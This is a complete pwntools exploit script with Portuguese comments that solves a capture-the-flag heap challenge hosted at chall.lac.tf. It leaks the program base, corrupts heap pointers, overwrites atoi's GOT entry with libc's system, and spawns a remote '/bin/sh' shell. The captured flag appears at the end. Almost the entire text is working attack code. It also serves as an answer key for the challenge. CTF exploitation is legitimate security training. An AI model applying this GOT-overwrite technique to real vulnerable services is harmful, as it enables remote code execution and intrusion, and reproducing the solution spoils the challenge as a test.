from pwn import *

elf = context.binary = ELF("./chall")
libc = ELF("./libc.so.6")
#p = process()
p = remote("chall.lac.tf", 31338)

def create(idx):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"index: ", idx)

def write(payload):
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b"data: ", payload)

def test():
    p.sendlineafter(b"Choice: ", b"3")
    p.recvuntil(b"data: ")
    return int.from_bytes(p.recvline()[:8], byteorder="little")

def explore(idx):
    p.sendlineafter(b"Choice: ", b"4")
    p.sendlineafter(b"index: ", idx)

def reset():
    p.sendlineafter(b"Choice: ", b"5")

# Vazamento da main.
p.recvuntil(b"gift: ")
main_leak = int(p.recvline().decode()[:-1], 16)
elf.address = main_leak - elf.sym["main"]

# Preparando chunks.
create(b"0")
create(b"1") # <- prev
explore(b"0") # <- curr

# Montando payload
payload = b"A" * 0x30 + p64(elf.got["atoi"] - 0x40)
write(payload)

# Vazando endereço da atoi.
reset()
create(b"2")
explore(b"1")
explore(b"0")
atoi_leak = test()
libc.address = atoi_leak - libc.sym["atoi"]

# Chamando a system.
write(p64(libc.sym["system"]))
p.sendlineafter(b"Choice: ", b"/bin/sh")
p.interactive()

# lactf{ro9u3_LIk3_No7_R34LlY_RO9U3_H34P_LIK3_nO7_r34llY_H34P}